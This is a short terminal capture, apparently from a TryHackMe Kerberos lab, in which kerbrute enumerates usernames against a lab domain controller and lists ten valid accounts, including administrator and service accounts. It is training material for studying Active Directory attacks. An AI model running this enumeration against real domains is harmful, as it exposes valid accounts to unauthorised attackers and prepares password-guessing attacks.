
```sh
┌──(fixit42㉿kali)-[~/boxes/thm/Attacking Kerberos]
└─$ ~/tools/kerbrute userenum --dc 10.10.182.49 -d controller.local usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/15/25 - Ronnie Flathers @ropnop

2025/08/15 19:53:38 >  Using KDC(s):
2025/08/15 19:53:38 >   10.10.182.49:88

2025/08/15 19:53:38 >  [+] VALID USERNAME:       admin1@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       administrator@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       admin2@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       httpservice@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       machine2@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       machine1@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       sqlservice@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       user1@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       user2@controller.local
2025/08/15 19:53:38 >  [+] VALID USERNAME:       user3@controller.local
2025/08/15 19:53:38 >  Done! Tested 100 usernames (10 valid) in 0.418 seconds
```